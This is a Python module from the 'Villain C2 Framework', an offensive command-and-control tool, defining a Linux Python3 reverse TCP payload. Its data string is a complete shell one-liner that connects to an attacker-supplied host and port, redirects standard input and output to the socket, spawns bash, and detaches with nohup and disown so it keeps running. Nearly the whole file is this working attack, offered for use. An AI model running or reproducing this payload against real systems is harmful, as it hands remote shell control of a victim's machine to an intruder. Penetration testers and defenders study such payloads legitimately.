# This module is part of the "Villain C2 Framework"

from typing import ClassVar


class Payload:

    info: ClassVar[dict] = {
        'Title' : 'Linux Python3 reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic Python3 reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta: ClassVar[dict] = {
        'handler' : 'netcat',
        'type' : 'python3-reverse-tcp',
        'os' : 'linux'   
    }

    config: ClassVar[dict] = {}

    parameters: ClassVar[dict] = {
        'lhost' : None
    }

    attrs: ClassVar[dict] = {}

    data = "export LHOST=\"*LHOST*\"; export LPORT=*LPORT*; nohup python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"LHOST\"),int(os.getenv(\"LPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")' > /dev/null 2>&1 & disown"
